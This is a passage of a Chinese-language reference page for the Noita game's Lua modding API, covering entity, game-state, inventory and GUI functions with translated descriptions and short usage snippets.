class="token string">"CHARM"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntityRemoveStainStatusEffect"><a href="#EntityRemoveStainStatusEffect" class="headerlink" title="EntityRemoveStainStatusEffect"></a><code>EntityRemoveStainStatusEffect</code></h3><blockquote><p>EntityRemoveStainStatusEffect( entity:int, status_type_id:string, status_cooldown:int = 0 )</p></blockquote><p>移除实体的沾染效果，输入实体id，状态名，冷却（默认为0），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityRemoveStainStatusEffect</span><span class="token punctuation">(</span> player_id<span class="token punctuation">,</span> <span class="token string">"PROTECTION_ALL"</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntityAddRandomStains"><a href="#EntityAddRandomStains" class="headerlink" title="EntityAddRandomStains"></a><code>EntityAddRandomStains</code></h3><blockquote><p>EntityAddRandomStains( entity:int, material_type:number, amount:number ) [Adds random visible stains of ‘material_type’ to entity. ‘amount’ controls the number of stain cells added. Does nothing if ‘entity’ doesn’t have a SpriteStainsComponent. Use CellFactory_GetType() to convert a material name to material type.]</p></blockquote><p>增加沾染脏污的贴图效果，输入实体id，材料id（CellFactory_GetType()），数量。增加随机的可见的脏污到实体上，amount控制添加的像素数，如果没有SpriteStainsComponent则什么也不会发生。</p><h3 id="EntitySetDamageFromMaterial"><a href="#EntitySetDamageFromMaterial" class="headerlink" title="EntitySetDamageFromMaterial"></a><code>EntitySetDamageFromMaterial</code></h3><blockquote><p>EntitySetDamageFromMaterial( entity:int, material_name:string, damage:number ) [Modifies DamageModelComponents materials_that_damage and materials_how_much_damage variables (and their parsed out data structures)]</p></blockquote><p>设置实体的材料伤害，输入实体id，材料名，伤害。修改DamageModelComponent中的materials_that_damage和materials_how_much_damage variables字段。<br>两个字段的定义：<br><pre class="line-numbers language-none"><code class="language-none">std::string        materials_that_damage               acid [0, 1]         list of materials that do damage, separated by &#39;,&#39; e.g. &#39;acid, fire, smoke&#39;&quot;std::string        materials_how_much_damage           0.1 [0, 1]          &quot;list of damage amount per material in materials_that_damage, separated by &#39;,&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">12</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_polymorph"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">13</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_random_polymorph"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">14</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_teleportation"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">15</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_movement_faster"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"material_confusion"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityRefreshSprite"><a href="#EntityRefreshSprite" class="headerlink" title="EntityRefreshSprite"></a><code>EntityRefreshSprite</code></h3><blockquote><p>EntityRefreshSprite( entity:int, sprite_component:int ) [Immediately refreshes the given SpriteComponent. Might be useful with text sprites if you want them to update more often than once a second.]</p></blockquote><p>立刻刷新贴图组件。如果想要文本贴图超过每秒更新一次可能会有用。输入实体id，组件id</p><h3 id="EntityGetWandCapacity"><a href="#EntityGetWandCapacity" class="headerlink" title="EntityGetWandCapacity"></a><code>EntityGetWandCapacity</code></h3><blockquote><p>EntityGetWandCapacity( entity:int ) -&gt; int [Returns the capacity of a wand entity, or 0 if ‘entity’ doesnt exist.]</p></blockquote><p>获取魔杖容量，输入魔杖的实体id，返回容量，如果不存在返回0</p><h3 id="EntityGetHotspot"><a href="#EntityGetHotspot" class="headerlink" title="EntityGetHotspot"></a><code>EntityGetHotspot</code></h3><blockquote><p>EntityGetHotspot( entity:int, hotspot_tag:string, transformed:bool, include_disabled_components:bool = false ) -&gt; x:number,y:number [Returns the position of a hot spot defined by a HotspotComponent. If ‘transformed’ is true, will return the position in world coordinates, transformed using the entity’s transform.]</p></blockquote><p>获取HotspotComponent的位置，比如手，发射点等等。输入实体id，热点标签，是否transformed，是否包含禁用的组件，返回坐标。如果transformed为true，返回在世界坐标系下的坐标<br>参考：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HotspotComponent</span>      <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hand<span class="token punctuation">"</span></span>      <span class="token attr-name">sprite_hotspot_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hand<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HotspotComponent</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HotspotComponent</span>    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shoot_pos<span class="token punctuation">"</span></span>    <span class="token attr-name">offset.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>    <span class="token attr-name">offset.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-2<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HotspotComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityGetFirstHitboxCenter"><a href="#EntityGetFirstHitboxCenter" class="headerlink" title="EntityGetFirstHitboxCenter"></a><code>EntityGetFirstHitboxCenter</code></h3><blockquote><p>EntityGetFirstHitboxCenter( entity_id:int ) -&gt; (x:number,y:number)|nil [Returns the centroid of first enabled HitboxComponent found in entity, the position of the entity if no hitbox is found, or nil if the entity does not exist. All returned positions are in world coordinates.]</p></blockquote><p>返回实体第一个没禁用的HitboxComponent组件的中心，没有该组件则返回实体坐标，实体不存在返回nil，均为世界坐标系下的。</p><h2 id="Game……"><a href="#Game……" class="headerlink" title="Game……"></a>Game……</h2><h3 id="GameScreenshake"><a href="#GameScreenshake" class="headerlink" title="GameScreenshake"></a><code>GameScreenshake</code></h3><blockquote><p>GameScreenshake( strength:number, x:number = camera_x, y:number = camera_y )</p></blockquote><p>摇晃屏幕，输入力度（参考值：5-150），一对坐标，默认镜头位置</p><h3 id="GameOnCompleted"><a href="#GameOnCompleted" class="headerlink" title="GameOnCompleted"></a><code>GameOnCompleted</code></h3><blockquote><p>GameOnCompleted() — this does the achievement</p></blockquote><p>用处不明，似乎只是做一个标记</p><h3 id="GameGiveAchievement"><a href="#GameGiveAchievement" class="headerlink" title="GameGiveAchievement"></a><code>GameGiveAchievement</code></h3><blockquote><p>GameGiveAchievement( id:string )</p></blockquote><p>输入成就的名称，一个字符串，给予成就。效果同上，似乎只是做个标记，不对游戏内容产生影响</p><h3 id="GameDoEnding2"><a href="#GameDoEnding2" class="headerlink" title="GameDoEnding2()"></a><code>GameDoEnding2()</code></h3><blockquote><p>GameDoEnding2()</p></blockquote><p>进入和平结局（33魔球）</p><h3 id="GameIsIntroPlaying"><a href="#GameIsIntroPlaying" class="headerlink" title="GameIsIntroPlaying"></a><code>GameIsIntroPlaying</code></h3><blockquote><p>GameIsIntroPlaying() -&gt; bool</p></blockquote><p>游戏是否在播放intro动画？大概是这个意思吧，返回一个bool值</p><h3 id="GameGetIsGamepadConnected"><a href="#GameGetIsGamepadConnected" class="headerlink" title="GameGetIsGamepadConnected"></a><code>GameGetIsGamepadConnected</code></h3><blockquote><p>GameGetIsGamepadConnected() -&gt; bool</p></blockquote><p>游戏是否连接了手柄</p><h3 id="GameGetWorldStateEntity"><a href="#GameGetWorldStateEntity" class="headerlink" title="GameGetWorldStateEntity"></a><code>GameGetWorldStateEntity</code></h3><blockquote><p>GameGetWorldStateEntity() -&gt; entity_id:int</p></blockquote><p>获取世界状态实体，返回实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> world_state_entity <span class="token operator">=</span> <span class="token function">GameGetWorldStateEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">local</span> comp <span class="token operator">=</span> <span class="token function">EntityGetComponent</span><span class="token punctuation">(</span> world_state_entity<span class="token punctuation">,</span> <span class="token string">"WorldStateComponent"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="GameGetPlayerStatsEntity"><a href="#GameGetPlayerStatsEntity" class="headerlink" title="GameGetPlayerStatsEntity"></a><code>GameGetPlayerStatsEntity</code></h3><blockquote><p>GameGetPlayerStatsEntity() -&gt; entity_id:int</p></blockquote><p>获取玩家状态实体，返回一个实体id，找不到使用参考</p><h3 id="GameGetOrbCountAllTime"><a href="#GameGetOrbCountAllTime" class="headerlink" title="GameGetOrbCountAllTime"></a><code>GameGetOrbCountAllTime</code></h3><blockquote><p>GameGetOrbCountAllTime() -&gt; int</p></blockquote><p>获取所有游戏历史中获取的最多魔球数量，返回一个int数</p><h3 id="GameGetOrbCountThisRun"><a href="#GameGetOrbCountThisRun" class="headerlink" title="GameGetOrbCountThisRun"></a><code>GameGetOrbCountThisRun</code></h3><blockquote><p>GameGetOrbCountThisRun() -&gt; int</p></blockquote><p>获取本局游戏中的魔球获取数量，返回一个int数</p><h3 id="GameGetOrbCollectedThisRun"><a href="#GameGetOrbCollectedThisRun" class="headerlink" title="GameGetOrbCollectedThisRun"></a><code>GameGetOrbCollectedThisRun</code></h3><blockquote><p>GameGetOrbCollectedThisRun( orb_id_zero_based:int ) -&gt; bool</p></blockquote><p>输入一个魔球id，返回是否在本局中已收集</p><h3 id="GameGetOrbCollectedAllTime"><a href="#GameGetOrbCollectedAllTime" class="headerlink" title="GameGetOrbCollectedAllTime"></a><code>GameGetOrbCollectedAllTime</code></h3><blockquote><p>GameGetOrbCollectedAllTime( orb_id_zero_based:int ) -&gt; bool</p></blockquote><p>输入一个魔球id，返回是否在所有游戏历史中收集过</p><h3 id="GameClearOrbsFoundThisRun"><a href="#GameClearOrbsFoundThisRun" class="headerlink" title="GameClearOrbsFoundThisRun"></a><code>GameClearOrbsFoundThisRun</code></h3><blockquote><p>GameClearOrbsFoundThisRun()</p></blockquote><p>归零本局游戏的魔球获取数量，游戏中用于开启NG+</p><h3 id="GameGetOrbCountTotal"><a href="#GameGetOrbCountTotal" class="headerlink" title="GameGetOrbCountTotal"></a><code>GameGetOrbCountTotal</code></h3><blockquote><p>GameGetOrbCountTotal() -&gt; int [Returns the number of orbs, picked or not.]</p></blockquote><p>返回魔球数，包含没捡起来的</p><h3 id="GameRegenItemAction"><a href="#GameRegenItemAction" class="headerlink" title="GameRegenItemAction"></a><code>GameRegenItemAction</code></h3><blockquote><p>GameRegenItemAction( entity_id:int )</p></blockquote><p>重新生成一个物品动作，输入实体id，找不到使用参考</p><h3 id="GameRegenItemActionsInContainer"><a href="#GameRegenItemActionsInContainer" class="headerlink" title="GameRegenItemActionsInContainer"></a><code>GameRegenItemActionsInContainer</code></h3><blockquote><p>GameRegenItemActionsInContainer( entity_id:int )</p></blockquote><p>重新生成一个container里的物品动作</p><h3 id="GameRegenItemActionsInPlayer"><a href="#GameRegenItemActionsInPlayer" class="headerlink" title="GameRegenItemActionsInPlayer"></a><code>GameRegenItemActionsInPlayer</code></h3><blockquote><p>GameRegenItemActionsInPlayer( entity_id:int )</p></blockquote><p>输入实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">（无限法术天赋）<span class="token comment">-- this goes through the items player is holding and sets their uses_remaining to -1</span><span class="token function">GameRegenItemActionsInPlayer</span><span class="token punctuation">(</span> entity_who_picked <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h3 id="GameKillInventoryItem"><a href="#GameKillInventoryItem" class="headerlink" title="GameKillInventoryItem"></a><code>GameKillInventoryItem</code></h3><blockquote><p>GameKillInventoryItem( inventory_owner_entity_id:int, item_entity_id:int )</p></blockquote><p>清除一个物品栏里的物品，输入物品栏拥有者实体id，物品实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> inventory_items <span class="token operator">=</span> <span class="token function">EntityGetAllChildren</span><span class="token punctuation">(</span> inventory <span class="token punctuation">)</span><span class="token comment">-- remove default items</span><span class="token keyword">if</span> inventory_items <span class="token operator">~=</span> <span class="token keyword">nil</span> <span class="token keyword">then</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>item_entity <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span> inventory_items <span class="token punctuation">)</span> <span class="token keyword">do</span><span class="token function">GameKillInventoryItem</span><span class="token punctuation">(</span> player_entity<span class="token punctuation">,</span> item_entity <span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="GamePickUpInventoryItem"><a href="#GamePickUpInventoryItem" class="headerlink" title="GamePickUpInventoryItem"></a><code>GamePickUpInventoryItem</code></h3><blockquote><p>GamePickUpInventoryItem( who_picks_up_entity_id:int, item_entity_id:int, do_pick_up_effects:bool = true )</p></blockquote><p>输入捡起实体的id，物品id，是否产生一个捡起的效果（默认有），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">（给予初始杖）<span class="token keyword">local</span> item_entity <span class="token operator">=</span> <span class="token function">EntityLoad</span><span class="token punctuation">(</span> item<span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">997</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">853</span> <span class="token punctuation">)</span><span class="token function">GamePickUpInventoryItem</span><span class="token punctuation">(</span> player_entity<span class="token punctuation">,</span> item_entity<span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h3 id="GameGetAllInventoryItems"><a href="#GameGetAllInventoryItems" class="headerlink" title="GameGetAllInventoryItems"></a><code>GameGetAllInventoryItems</code></h3><blockquote><p>GameGetAllInventoryItems( entity_id:int ) -&gt; {item_entity_id}|nil [Returns all the inventory items that entity_id has.]</p></blockquote><p>输入实体id，返回该实体有的所有的物品栏id（表）</p><h3 id="GameDropAllItems"><a href="#GameDropAllItems" class="headerlink" title="GameDropAllItems"></a><code>GameDropAllItems</code></h3><blockquote><p>GameDropAllItems( entity_id:int )</p></blockquote><p>输入实体id，drop所有物品，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> entity_id <span class="token operator">=</span> <span class="token function">GetUpdatedEntityID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">GameDropAllItems</span><span class="token punctuation">(</span> entity_id <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="GameDropPlayerInventoryItems"><a href="#GameDropPlayerInventoryItems" class="headerlink" title="GameDropPlayerInventoryItems"></a><code>GameDropPlayerInventoryItems</code></h3><blockquote><p>GameDropPlayerInventoryItems( entity_id:int )</p></blockquote><p>drop玩家的物品栏物品，找不到使用参考</p><h3 id="GameDestroyInventoryItems"><a href="#GameDestroyInventoryItems" class="headerlink" title="GameDestroyInventoryItems"></a><code>GameDestroyInventoryItems</code></h3><blockquote><p>GameDestroyInventoryItems( player_entity )</p></blockquote><p>销毁物品栏物品，输入实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">OnPlayerDied</span><span class="token punctuation">(</span> player_entity <span class="token punctuation">)</span><span class="token function">GameDestroyInventoryItems</span><span class="token punctuation">(</span> player_entity <span class="token punctuation">)</span><span class="token function">GameTriggerGameOver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="GameIsInventoryOpen"><a href="#GameIsInventoryOpen" class="headerlink" title="GameIsInventoryOpen"></a><code>GameIsInventoryOpen</code></h3><blockquote><p>GameIsInventoryOpen() -&gt; bool</p></blockquote><p>是否打开了物品栏（背包），返回一个bool值</p><h3 id="GameTriggerGameOver"><a href="#GameTriggerGameOver" class="headerlink" title="GameTriggerGameOver"></a><code>GameTriggerGameOver</code></h3><blockquote><p>GameTriggerGameOver()</p></blockquote><p>结束游戏，弹出结算页面，同时镜头不跟随玩家，不负责销毁游戏实体</p><h3 id="GameShootProjectile"><a href="#GameShootProjectile" class="headerlink" title="GameShootProjectile"></a><code>GameShootProjectile</code></h3><blockquote><p>GameShootProjectile( shooter_entity:int, x:number, y:number, target_x:number, target_y:number, projectile_entity:int, send_message:bool = true, verlet_parent_entity:int = 0 ) [‘shooter_entity’ can be 0. Warning: If ‘projectile_entity’ has PhysicsBodyComponent and ItemComponent, components without the “enabled_in_world” tag will be disabled, as if the entity was thrown by player.]</p></blockquote><p>发射一个投射物，输入发射者（实体id，可以为0），起点坐标，目标点坐标，投射物实体id，后两个默认，用处未知。如果投射物实体有PhysicsBodyComponent 和 ItemComponent组件，没有“enabled_in_world”标签的组件将不可用，就好像是玩家发出的（翻译官表示没看懂）</p><p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ui_name<span class="token operator">=</span><span class="token string">"Test GameShootProjectile bug"</span><span class="token punctuation">,</span>action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">local</span> x<span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token function">GameGetCameraPos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">local</span> e <span class="token operator">=</span> <span class="token function">EntityLoad</span><span class="token punctuation">(</span> <span class="token string">"data/entities/items/pickup/goldnugget_200.xml"</span> <span class="token punctuation">)</span><span class="token function">GameShootProjectile</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="GameCreateSpriteForXFrames"><a href="#GameCreateSpriteForXFrames" class="headerlink" title="GameCreateSpriteForXFrames"></a><code>GameCreateSpriteForXFrames</code></h3><blockquote><p>GameCreateSpriteForXFrames( filename:string, x:number, y:number, centered:bool = true, sprite_offset_x:number = 0, sprite_offset_y:number = 0, frames:int = 1, emissive:bool = false )</p></blockquote><p>显示一个贴图x帧，输入贴图所在文件路径，坐标，是否居中，坐标偏移，持续帧数（默认1），是否发光，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/"</span> <span class="token operator">..</span> map_sprite <span class="token operator">..</span> <span class="token string">".png"</span><span class="token punctuation">,</span> mi_x<span class="token punctuation">,</span> mi_y<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span><span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/spatial_map_player.png"</span><span class="token punctuation">,</span> pi_x<span class="token punctuation">,</span> pi_y<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span><span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/spatial_map_friend.png"</span><span class="token punctuation">,</span> mi_x <span class="token operator">+</span> fx<span class="token punctuation">,</span> mi_y <span class="token operator">+</span> fy<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><h3 id="GuiCreate"><a href="#GuiCreate" class="headerlink" title="GuiCreate"></a><code>GuiCreate</code></h3><blockquote><p>GuiCreate() -&gt; gui:obj</p></blockquote><p>创造一个gui，返回一个gui对象，用于进一步操作</p><h3 id="GuiDestroy"><a href="#GuiDestroy" class="headerlink" title="GuiDestroy"></a><code>GuiDestroy</code></h3><blockquote><p>GuiDestroy( gui:obj )</p></blockquote><p>销毁gui</p><h3 id="GuiStartFrame"><a href="#GuiStartFrame" class="headerlink" title="GuiStartFrame"></a><code>GuiStartFrame</code></h3><blockquote><p>GuiStartFrame( gui:obj )</p></blockquote><p>开始GUI帧，在OnWorldPreUpdate时调用，使用gui必要的函数</p><h3 id="GuiOptionsAdd"><a href="#GuiOptionsAdd" class="headerlink" title="GuiOptionsAdd"></a><code>GuiOptionsAdd</code></h3><blockquote><p>GuiOptionsAdd( gui:obj, option:int ) [Sets the options that apply to widgets during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget. The options will be cleared on next call to GuiStartFrame().]</p></blockquote><p>给gui增加“选项”，应用一个gui的所有widget，生效一帧，选项列表如下：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">GUI_OPTION <span class="token operator">=</span> <span class="token punctuation">&#123;</span>None <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>IsDraggable <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">-- you might not want to use this, because there will be various corner cases and bugs, but feel free to try anyway.</span>NonInteractive <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">-- works with GuiButton</span>AlwaysClickable <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>ClickCancelsDoubleClick <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>IgnoreContainer <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>NoPositionTween <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">,</span>ForceFocusable <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span>HandleDoubleClickAsClick <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span>GamepadDefaultWidget <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token comment">-- it's recommended you use this to communicate the widget where gamepad input will focus when entering a new menu</span><span class="token comment">-- these work as intended (mostly)</span>Layout_InsertOutsideLeft <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>Layout_InsertOutsideRight <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">,</span>Layout_InsertOutsideAbove <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">,</span>Layout_ForceCalculate <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">,</span>Layout_NextSameLine <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">,</span>Layout_NoLayouting <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span><span class="token comment">-- these work as intended (mostly)</span>Align_HorizontalCenter <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">,</span>Align_Left <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">,</span>FocusSnapToRightEdge <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">,</span>NoPixelSnapY <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">,</span>DrawAlwaysVisible <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span>DrawNoHoverAnimation <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">,</span>DrawWobble <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">,</span>DrawFadeIn <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">,</span>DrawScaleIn <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">,</span>DrawWaveAnimateOpacity <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">,</span>DrawSemiTransparent <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">,</span>DrawActiveWidgetCursorOnBothSides <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">,</span>DrawActiveWidgetCursorOff <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">,</span>TextRichRendering <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">,</span>NoSound <span class="token operator">=</span> <span class="token number">47</span><span class="token punctuation">,</span>Hack_ForceClick <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">,</span>Hack_AllowDuplicateIds <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span>ScrollContainer_Smooth <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span>IsExtraDraggable <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span>_SnapToCenter <span class="token operator">=</span> <span class="token number">62</span><span class="token punctuation">,</span>Disabled <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="GuiOptionsAddForNextWidget"><a href="#GuiOptionsAddForNextWidget" class="headerlink" title="GuiOptionsAddForNextWidget"></a><code>GuiOptionsAddForNextWidget</code></h3><blockquote><p>GuiOptionsAddForNextWidget( gui:obj, option:int ) [Sets the options that apply to the next widget during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget.</p></blockquote><p>为下一个widget设置“选项”，参数同上，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GuiOptionsAddForNextWidget</span><span class="token punctuation">(</span> gui<span class="token punctuation">,</span> GUI_OPTION<span class="token punctuation">.</span>DrawActiveWidgetCursorOff <span class="token punctuation">)</span><span class="token function">GuiOptionsAddForNextWidget</span><span class="token punctuation">(</span> gui<span class="token punctuation">,</span> GUI_OPTION<span class="token punctuation">.</span>NoPositionTween <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="GuiOptionsRemove"><a href="#GuiOptionsRemove" class="headerlink" title="GuiOptionsRemove"></a><code>GuiOptionsRemove</code></h3><blockquote><p>GuiOptionsRemove( gui:obj, option:int ) [Sets the options that apply to widgets during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. 